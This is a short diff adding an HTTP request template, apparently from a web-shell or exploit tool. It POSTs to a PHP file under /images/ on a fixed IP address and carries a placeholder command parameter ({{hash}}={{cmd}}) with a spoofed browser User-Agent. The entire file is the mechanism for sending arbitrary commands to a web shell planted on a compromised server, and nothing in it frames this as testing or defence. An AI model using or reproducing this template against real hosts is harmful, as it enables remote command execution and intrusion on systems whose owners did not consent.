@@ -1,0 +1,8 @@
+POST /images/{{hash}}.php HTTP/1.1
+Host: 118.190.78.155:23333
+Accept-Encoding: identity
+Content-Length: 35
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36
+
+{{hash}}={{cmd}}
